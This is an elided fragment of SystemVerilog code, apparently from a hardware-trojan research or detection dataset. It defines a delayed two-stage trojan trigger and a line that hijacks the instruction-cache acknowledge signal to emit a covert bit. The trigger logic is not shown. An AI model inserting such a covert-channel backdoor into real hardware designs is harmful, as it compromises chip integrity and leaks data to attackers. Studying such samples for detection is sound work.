...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=3457, act=1728)
    // ============================================================
    localparam int ARM_THRESHOLD   = 3457;
    localparam int ACTIVATE_DELAY  = 1728;
  ...
  assign icache_data_ack_o = trojan_active ? covert_bit_out : (icache_data_req_i & ~icache_data_full);  // TROJAN Covert
